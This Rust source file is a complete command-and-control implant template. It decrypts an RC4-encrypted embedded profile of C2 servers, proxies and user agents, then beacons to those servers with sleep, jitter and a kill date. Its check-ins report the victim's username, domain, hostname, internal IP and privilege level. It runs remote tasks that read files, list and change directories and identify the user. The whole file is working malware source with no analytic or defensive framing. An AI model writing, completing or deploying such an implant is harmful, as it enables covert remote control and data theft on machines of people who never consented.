use std::env;
use std::fs;
use std::io::Read;
use std::net::UdpSocket;
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use rand::Rng;

const PROFILE_DATA: &[u8] = &[PROFILE_PLACEHOLDER];
const PROFILE_SIZE: usize = PROFILE_SIZE_PLACEHOLDER;

struct Config {
    kill_date: i32,
    working_time: i32,
    sleep_time: i32,
    jitter: i32,
    listener_watermark: u32,
    use_ssl: bool,
    hosts: Vec<String>,
    ports: Vec<i32>,
    http_method: String,
    uris: Vec<String>,
    parameter_name: String,
    user_agents: Vec<String>,
    request_headers: String,
    ans_offset1: i32,
    ans_offset2: i32,
    host_headers: Vec<String>,
    rotation_mode: i32,
    proxy_type: i32,
    proxy_host: String,
    proxy_port: i32,
    encrypt_key: Vec<u8>,
    session_key: Vec<u8>,
}

fn rc4_crypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    let mut s: Vec<u8> = (0u8..=255).collect();
    let mut j: usize = 0;
    for i in 0..256 {
        j = (j + s[i] as usize + key[i % key.len()] as usize) & 0xFF;
        s.swap(i, j);
    }
    let mut output = vec![0u8; data.len()];
    let (mut a, mut b): (usize, usize) = (0, 0);
    for k in 0..data.len() {
        a = (a + 1) & 0xFF;
        b = (b + s[a] as usize) & 0xFF;
        s.swap(a, b);
        output[k] = data[k] ^ s[(s[a] as usize + s[b] as usize) & 0xFF];
    }
    output
}

fn read_i32_le(data: &[u8], pos: &mut usize) -> i32 {
    if *pos + 4 > data.len() { return 0; }
    let val = i32::from_le_bytes([data[*pos], data[*pos+1], data[*pos+2], data[*pos+3]]);
    *pos += 4;
    val
}

fn read_bool(data: &[u8], pos: &mut usize) -> bool {
    if *pos >= data.len() { return false; }
    let val = data[*pos];
    *pos += 1;
    val != 0
}

fn read_string_le(data: &[u8], pos: &mut usize) -> String {
    let length = read_i32_le(data, pos) as usize;
    if length == 0 || *pos + length > data.len() { return String::new(); }
    let s = String::from_utf8_lossy(&data[*pos..*pos + length])
        .trim_end_matches('\0').to_string();
    *pos += length;
    s
}

fn pack_be32(buf: &mut Vec<u8>, val: u32) {
    buf.extend_from_slice(&val.to_be_bytes());
}

fn pack_be16(buf: &mut Vec<u8>, val: u16) {
    buf.extend_from_slice(&val.to_be_bytes());
}

fn pack_be64(buf: &mut Vec<u8>, val: u64) {
    buf.extend_from_slice(&val.to_be_bytes());
}

fn pack_be_bytes(buf: &mut Vec<u8>, data: &[u8]) {
    pack_be32(buf, data.len() as u32);
    buf.extend_from_slice(data);
}

fn pack_be_string(buf: &mut Vec<u8>, s: &str) {
    let mut b = s.as_bytes().to_vec();
    b.push(0);
    pack_be32(buf, b.len() as u32);
    buf.extend_from_slice(&b);
}

fn parse_profile(data: &[u8]) -> Config {
    let mut pos: usize = 0;
    let enc_len = read_i32_le(data, &mut pos) as usize;
    let enc_data = &data[pos..pos + enc_len];
    pos += enc_len;
    let encrypt_key = data[pos..].to_vec();

    let decrypted = rc4_crypt(enc_data, &encrypt_key);
    let mut dpos: usize = 0;

    let _agent_watermark = read_i32_le(&decrypted, &mut dpos) as u32;
    let kill_date = read_i32_le(&decrypted, &mut dpos);
    let working_time = read_i32_le(&decrypted, &mut dpos);
    let sleep_time = read_i32_le(&decrypted, &mut dpos);
    let jitter = read_i32_le(&decrypted, &mut dpos);
    let listener_watermark = read_i32_le(&decrypted, &mut dpos) as u32;

    let use_ssl = read_bool(&decrypted, &mut dpos);
    let c2_count = read_i32_le(&decrypted, &mut dpos) as usize;
    let mut hosts = Vec::with_capacity(c2_count);
    let mut ports = Vec::with_capacity(c2_count);
    for _ in 0..c2_count {
        hosts.push(read_string_le(&decrypted, &mut dpos));
        ports.push(read_i32_le(&decrypted, &mut dpos));
    }
    let http_method = read_string_le(&decrypted, &mut dpos);
    let uri_count = read_i32_le(&decrypted, &mut dpos) as usize;
    let mut uris = Vec::with_capacity(uri_count);
    for _ in 0..uri_count { uris.push(read_string_le(&decrypted, &mut dpos)); }
    let parameter_name = read_string_le(&decrypted, &mut dpos);
    let ua_count = read_i32_le(&decrypted, &mut dpos) as usize;
    let mut user_agents = Vec::with_capacity(ua_count);
    for _ in 0..ua_count { user_agents.push(read_string_le(&decrypted, &mut dpos)); }
    let request_headers = read_string_le(&decrypted, &mut dpos);
    let ans_offset1 = read_i32_le(&decrypted, &mut dpos);
    let ans_offset2 = read_i32_le(&decrypted, &mut dpos);
    let hh_count = read_i32_le(&decrypted, &mut dpos) as usize;
    let mut host_headers = Vec::with_capacity(hh_count);
    for _ in 0..hh_count { host_headers.push(read_string_le(&decrypted, &mut dpos)); }
    let rotation_mode = read_i32_le(&decrypted, &mut dpos);
    let proxy_type = read_i32_le(&decrypted, &mut dpos);
    let proxy_host = read_string_le(&decrypted, &mut dpos);
    let proxy_port = read_i32_le(&decrypted, &mut dpos);
    let _proxy_username = read_string_le(&decrypted, &mut dpos);
    let _proxy_password = read_string_le(&decrypted, &mut dpos);

    let mut session_key = vec![0u8; 16];
    rand::thread_rng().fill(&mut session_key[..]);

    Config {
        kill_date, working_time, sleep_time, jitter,
        listener_watermark, use_ssl, hosts, ports, http_method, uris,
        parameter_name, user_agents, request_headers, ans_offset1, ans_offset2,
        host_headers, rotation_mode, proxy_type, proxy_host, proxy_port,
        encrypt_key, session_key,
    }
}

fn get_username() -> String {
    env::var("USERNAME").or_else(|_| env::var("USER")).unwrap_or_default()
}

fn get_domain() -> String {
    env::var("USERDOMAIN").unwrap_or_else(|_| get_hostname())
}

fn get_hostname() -> String {
    #[cfg(unix)]
    {
        fs::read_to_string("/etc/hostname")
            .map(|s| s.trim().to_string())
            .unwrap_or_default()
    }
    #[cfg(not(unix))]
    {
        env::var("COMPUTERNAME").unwrap_or_default()
    }
}

fn get_internal_ip() -> u32 {
    if let Ok(s) = UdpSocket::bind("0.0.0.0:0") {
        if s.connect("8.8.8.8:53").is_ok() {
            if let Ok(addr) = s.local_addr() {
                if let std::net::IpAddr::V4(ip) = addr.ip() {
                    let o = ip.octets();
                    return (o[0] as u32) | (o[1] as u32) << 8
                        | (o[2] as u32) << 16 | (o[3] as u32) << 24;
                }
            }
        }
    }
    0x7F000001
}

fn is_elevated() -> bool {
    #[cfg(unix)]
    { unsafe { libc_getuid() == 0 } }
    #[cfg(not(unix))]
    { false }
}

#[cfg(unix)]
extern "C" { fn getuid() -> u32; }
#[cfg(unix)]
unsafe fn libc_getuid() -> u32 { getuid() }

fn build_checkin(config: &Config) -> Vec<u8> {
    let mut buf = Vec::new();

    pack_be32(&mut buf, config.sleep_time as u32);
    pack_be32(&mut buf, config.jitter as u32);
    pack_be32(&mut buf, config.kill_date as u32);
    pack_be32(&mut buf, config.working_time as u32);
    pack_be16(&mut buf, 0); // ACP
    pack_be16(&mut buf, 0); // OemCP
    buf.push(0); // GMT offset

    let pid = std::process::id();
    pack_be16(&mut buf, (pid & 0xFFFF) as u16);
    pack_be16(&mut buf, 0); // TID

    let (major, minor, build) = if cfg!(windows) { (10u8, 0u8, 19041u32) } else { (0, 0, 0) };
    let internal_ip = get_internal_ip();
    let mut flags: u8 = 0;
    if cfg!(target_pointer_width = "64") { flags |= 0x03; }
    if is_elevated() { flags |= 0x04; }

    pack_be32(&mut buf, build);
    buf.push(major);
    buf.push(minor);
    pack_be32(&mut buf, internal_ip);
    buf.push(flags);

    pack_be_bytes(&mut buf, &config.session_key);
    pack_be_bytes(&mut buf, get_domain().as_bytes());
    pack_be_bytes(&mut buf, get_hostname().as_bytes());
    pack_be_bytes(&mut buf, get_username().as_bytes());

    let proc_name = env::current_exe()
        .map(|p| p.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default())
        .unwrap_or_default();
    pack_be_bytes(&mut buf, proc_name.as_bytes());

    buf
}

fn process_tasks(config: &Config, data: &[u8]) -> Vec<u8> {
    if data.len() < 4 { return Vec::new(); }

    let mut pos: usize = 0;
    let _ = read_i32_le(data, &mut pos);

    let mut inner = Vec::new();

    while pos + 8 <= data.len() {
        let task_id = data[pos..pos + 4].to_vec();
        pos += 4;
        let command_id = read_i32_le(data, &mut pos);

        if let Some(result) = execute_command(command_id, data, &mut pos) {
            inner.extend_from_slice(&task_id);
            inner.extend_from_slice(&result);
        }
    }

    if inner.is_empty() { return Vec::new(); }

    let mut result = Vec::new();
    pack_be32(&mut result, (inner.len() + 4) as u32);
    result.extend_from_slice(&inner);
    result
}

fn execute_command(command_id: i32, data: &[u8], pos: &mut usize) -> Option<Vec<u8>> {
    let mut buf = Vec::new();

    match command_id {
        4 => {
            let pwd = env::current_dir().ok()?.to_string_lossy().to_string();
            pack_be32(&mut buf, command_id as u32);
            pack_be_string(&mut buf, &pwd);
        }
        22 => {
            let username = get_username();
            let domain = get_domain();
            let elevated = is_elevated();
            pack_be32(&mut buf, command_id as u32);
            buf.push(if elevated { 1 } else { 0 });
            pack_be_string(&mut buf, &domain);
            pack_be_string(&mut buf, &username);
        }
        8 => {
            let path = read_string_le(data, pos);
            env::set_current_dir(&path).ok()?;
            let new_dir = env::current_dir().ok()?.to_string_lossy().to_string();
            pack_be32(&mut buf, command_id as u32);
            pack_be_string(&mut buf, &new_dir);
        }
        24 => {
            let path = read_string_le(data, pos);
            let mut content = fs::read(&path).ok()?;
            if content.len() > 2048 { content.truncate(2048); }
            pack_be32(&mut buf, command_id as u32);
            pack_be_string(&mut buf, &path);
            pack_be_bytes(&mut buf, &content);
        }
        14 => {
            let dir_path = read_string_le(data, pos);
            match fs::read_dir(&dir_path) {
                Ok(rd) => {
                    let entries: Vec<_> = rd.filter_map(|e| e.ok()).collect();
                    pack_be32(&mut buf, command_id as u32);
                    buf.push(1);
                    pack_be_string(&mut buf, &dir_path);
                    pack_be32(&mut buf, entries.len() as u32);
                    for entry in &entries {
                        if let Ok(meta) = entry.metadata() {
                            if meta.is_dir() {
                                buf.push(1);
                                pack_be64(&mut buf, 0);
                            } else {
                                buf.push(0);
                                pack_be64(&mut buf, meta.len());
                            }
                            let modified = meta.modified().ok()
                                .and_then(|t| t.duration_since(UNIX_EPOCH).ok())
                                .map(|d| d.as_secs() as u32)
                                .unwrap_or(0);
                            pack_be32(&mut buf, modified);
                            pack_be_string(&mut buf, &entry.file_name().to_string_lossy());
                        }
                    }
                }
                Err(_) => {
                    pack_be32(&mut buf, command_id as u32);
                    buf.push(0);
                    pack_be32(&mut buf, 2);
                }
            }
        }
        10 => {
            let term_type = read_i32_le(data, pos);
            if term_type == 2 { std::process::exit(0); }
            return None;
        }
        _ => return None,
    }
    Some(buf)
}

fn http_post(config: &Config, data: &[u8], current_host: &mut usize) -> Vec<u8> {
    if config.hosts.is_empty() { return Vec::new(); }

    let mut rng = rand::thread_rng();
    let idx = if config.rotation_mode == 1 {
        rng.gen_range(0..config.hosts.len())
    } else {
        *current_host
    };
    *current_host = (*current_host + 1) % config.hosts.len();

    let scheme = if config.use_ssl { "https" } else { "http" };
    let uri = if !config.uris.is_empty() {
        &config.uris[rng.gen_range(0..config.uris.len())]
    } else {
        "/"
    };
    let url = format!("{}://{}:{}{}", scheme, config.hosts[idx], config.ports[idx], uri);

    let agent = ureq::AgentBuilder::new()
        .timeout_connect(Duration::from_secs(10))
        .timeout_read(Duration::from_secs(30))
        .build();

    let method = if config.http_method.is_empty() { "POST" } else { &config.http_method };

    let mut request = agent.request(method, &url);

    if !config.user_agents.is_empty() {
        request = request.set("User-Agent", &config.user_agents[rng.gen_range(0..config.user_agents.len())]);
    }

    if !config.request_headers.is_empty() {
        for line in config.request_headers.split('\n') {
            let line = line.trim();
            if let Some(sep) = line.find(':') {
                let key = line[..sep].trim();
                let val = line[sep + 1..].trim();
                if !key.is_empty() {
                    request = request.set(key, val);
                }
            }
        }
    }

    let response = if !data.is_empty() {
        request.set("Content-Type", "application/octet-stream")
            .send_bytes(data)
    } else {
        request.call()
    };

    match response {
        Ok(resp) => {
            let mut body = Vec::new();
            resp.into_reader().take(10 * 1024 * 1024).read_to_end(&mut body).ok();

            if config.ans_offset1 > 0 || config.ans_offset2 > 0 {
                let start = config.ans_offset1 as usize;
                let end = body.len().saturating_sub(config.ans_offset2 as usize);
                if end > start {
                    return body[start..end].to_vec();
                }
            }
            body
        }
        Err(_) => Vec::new(),
    }
}

fn main() {
    let config = parse_profile(PROFILE_DATA);

    let beat = build_checkin(&config);
    let enc_beat = rc4_crypt(&beat, &config.encrypt_key);

    let wm_bytes = config.listener_watermark.to_be_bytes();
    let mut payload = wm_bytes.to_vec();
    payload.extend_from_slice(&enc_beat);

    let mut current_host: usize = 0;
    let mut rng = rand::thread_rng();

    loop {
        let response = http_post(&config, &payload, &mut current_host);
        if !response.is_empty() {
            let dec_response = rc4_crypt(&response, &config.session_key);
            let result = process_tasks(&config, &dec_response);
            if !result.is_empty() {
                payload = rc4_crypt(&result, &config.session_key);
            } else {
                payload = Vec::new();
            }
        } else {
            payload = Vec::new();
        }

        let mut sleep_ms = config.sleep_time as u64 * 1000;
        if config.jitter > 0 {
            sleep_ms += rng.gen_range(0..sleep_ms * config.jitter as u64 / 100);
        }
        thread::sleep(Duration::from_millis(sleep_ms));

        if config.kill_date > 0 {
            let now = SystemTime::now().duration_since(UNIX_EPOCH)
                .unwrap_or_default().as_secs() as i64;
            if now >= config.kill_date as i64 { return; }
        }
    }
}
